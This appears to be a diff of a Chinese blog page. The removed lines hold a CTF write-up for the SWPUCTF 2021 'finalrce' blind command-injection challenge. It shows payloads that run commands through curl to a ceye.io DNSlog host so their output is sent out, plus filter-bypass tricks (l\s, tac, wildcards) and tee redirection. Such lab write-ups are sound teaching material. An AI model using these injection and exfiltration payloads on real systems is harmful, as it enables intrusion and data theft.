@@ -172,7 +172,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-05-17 00:00:00 / 修改时间：21:47:31" itemprop="dateCreated datePublished" datetime="2024-05-17T00:00:00+08:00">2024-05-17</time>
+              <time title="创建时间：2024-05-17 00:00:00 / 修改时间：21:49:22" itemprop="dateCreated datePublished" datetime="2024-05-17T00:00:00+08:00">2024-05-17</time>
             </span>
 
           
@@ -186,55 +186,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517193805294.png" alt="image-20240517193805294"></p>
-<p>有exec，一看就是无回显RCE，curl没有被过滤，可以尝试用ceye平台实现dnslog外带。</p>
-<h4 id="方法一：dnslog外带"><a href="#方法一：dnslog外带" class="headerlink" title="方法一：dnslog外带"></a>方法一：dnslog外带</h4><p>原理：DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=curl http://xxx.ceye.io/\`whoami\`</span><br></pre></td></tr></table></figure>
-
-<p>进行尝试，得到</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517195636853.png" alt="image-20240517195636853"></p>
-<p>发现确实可行，接着用ls查看根目录文件，由于ls被过滤，因此要用l\s进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload </span><br><span class="line">?url=curl http://xxx.ceye.io/`l\s /`</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517195656623.png" alt="image-20240517195656623"></p>
-<p>接下来查看文件内容，因为cat被过滤，可用ca\t或tac进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=curl http://xxx.ceye.io/`tac /a_here_is_a_f1ag`</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517195940040.png" alt="image-20240517195940040"></p>
-<p>flag在flllllaaaaaaggggggg里，直接读取（注意la被过滤）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=curl http://xxx.ceye.io/`tac /flllll\aaaaaaggggggg`</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517200810038.png" alt="image-20240517200810038"></p>
-<p>加上{}应该就行，如果想得到完整flag可以将flag用base32编码，将结果外带后解码得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=curl http://xxx.ceye.io/`tac /flllll\aaaaaaggggggg|base32`</span><br></pre></td></tr></table></figure>
-
-<p>得到的base32编码</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517201513441.png" alt="image-20240517201513441"></p>
-<p>解码后得到</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517201610836.png" alt="image-20240517201610836"></p>
-<h4 id="方法二：tee命令（输出重定向）"><a href="#方法二：tee命令（输出重定向）" class="headerlink" title="方法二：tee命令（输出重定向）"></a>方法二：tee命令（输出重定向）</h4><p>无回显RCE也可通过将命令执行结果重定向输出得到信息，本题中”&lt;”，”&gt;”都被过滤，因此可用tee命令进行绕过</p>
-<p><strong><code>tee</code> 命令在 Unix 和 Unix-like 操作系统中的作用是将标准输入 (stdin) 的内容复制到标准输出 (stdout) 以及一个或多个文件中。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=tac /flllll\aaaaaaggggggg | tee 1.txt //将flag值重定向输出到了1.txt中</span><br></pre></td></tr></table></figure>
-
-<p>访问1.txt，得到</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517202624397.png" alt="image-20240517202624397"></p>
-<h4 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h4><p>用curl命令实现dnslog外带会发现返回的结果只有一行，因此尝试使用tr ‘\n’ ‘ ‘将换行符 \n 替换为空格。这样，所有的行都会被合并成一行，返回结果用base32编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=curl http://xxx.ceye.io/`ls / | tr &#x27;\n&#x27; &#x27; &#x27; | base32`</span><br></pre></td></tr></table></figure>
-
-<p>解码后的结果</p>
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517203134862.png" alt="image-20240517203134862"></p>
-<p>发现长度不够，想得到g后面的字符，可以使用?进行匹配，但是不知道后面还有多少字符，可以多次尝试，发现用6个?可以得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=curl http://xxx.ceye.io/`tac /flllllaaaaaag??????| base32`</span><br></pre></td></tr></table></figure>
-
-<p>也可以用grep命令得到以flllllaaaaaag开头的文件名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">curl http://jykd1d.ceye.io/`l\s / |grep &#x27;^flllll\aaaaaag&#x27;|base32`</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/image-20240517214134254.png" alt="image-20240517214134254"></p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>做题时发现可以用的命令有很多，然后就试试能不能用多种方法，就当做多熟悉一些linux命令的练习了。</p>
-
+          <h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/05/17/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%A2%98(%E4%BA%8C)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
